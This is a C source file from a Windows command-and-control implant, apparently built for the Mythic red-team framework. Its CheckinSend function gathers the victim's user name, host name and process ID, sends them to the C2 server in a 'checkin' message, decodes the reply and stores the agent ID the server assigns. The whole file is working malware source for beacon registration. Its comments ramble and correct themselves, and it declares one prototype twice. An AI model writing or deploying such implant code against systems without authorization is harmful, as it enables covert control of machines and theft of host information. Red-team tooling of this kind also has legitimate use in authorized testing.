#include "Checkin.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// External Dependencies from main.c (should be moved to separate headers
// eventually)
extern char current_uuid[128];
extern char *send_c2_message(const char *json_msg);
extern char *base64_decode(const char *src, size_t len);
extern void extract_json_string(const char *key, const char *json, char *buffer,
                                size_t buffer_size);
// Note: argument order in extract_json_string prototype in main.c was (json,
// key, buffer, size) Let me double check main.c... main.c: void
// extract_json_string(const char *json, const char *key, char *buffer, size_t
// buffer_size) So I must match it.

// Redefining prototype to match main.c
extern void extract_json_string(const char *json, const char *key, char *buffer,
                                size_t buffer_size);

#include <windows.h>

BOOL CheckinSend() {
  char json_msg[4096];
  DWORD mypid = GetCurrentProcessId();

  char username[256];
  DWORD username_len = sizeof(username);
  if (!GetUserName(username, &username_len)) {
    strncpy(username, "UNKNOWN", sizeof(username));
  }

  char hostname[256];
  DWORD hostname_len = sizeof(hostname);
  if (!GetComputerName(hostname, &hostname_len)) {
    strncpy(hostname, "UNKNOWN", sizeof(hostname));
  }

  // Clean up username/hostname (sometimes contain garbage if buffer verified
  // strictly?) GetUserName returns null-terminated string.

  // Construct Checkin JSON
  // TODO: Implement dynamic IP and OS retrieval later if needed
  snprintf(json_msg, sizeof(json_msg),
           "{\"action\": \"checkin\", \"uuid\": \"%s\", \"ips\": "
           "[\"127.0.0.1\"], \"os\": \"windows\", \"user\": \"%s\", "
           "\"host\": \"%s\", \"pid\": %lu, \"architecture\": \"x64\", "
           "\"domain\": \"%s\"}",
           current_uuid, username, hostname, mypid, hostname);

  char *b64_resp = send_c2_message(json_msg);

  if (b64_resp && strlen(b64_resp) > 0) {
    char *json_resp = base64_decode(b64_resp, strlen(b64_resp));

    // Handle weird Mythic/Base64 offset if present (from main.c logic)
    if (json_resp && json_resp[0] != '{') {
      if (strlen(b64_resp) > 36) {
        free(json_resp);
        json_resp = base64_decode(b64_resp + 36, strlen(b64_resp) - 36);
      }
    }

    if (json_resp) {
      // Check for new UUID or success
      if (strstr(json_resp, "checkin") && strstr(json_resp, "\"id\"")) {
        char new_uuid[128] = {0};
        extract_json_string(json_resp, "id", new_uuid, sizeof(new_uuid));

        if (strlen(new_uuid) > 0) {
          strncpy(current_uuid, new_uuid, sizeof(current_uuid));
          // Checkin Successful
          free(json_resp);
          free(b64_resp);
          return TRUE;
        }
      }
      free(json_resp);
    }
    free(b64_resp);
    // If we got a response but no ID, it might strictly strictly mean failed?
    // Or maybe just ok. But for now return TRUE if we got a valid response?
    return TRUE;
  }

  return FALSE;
}
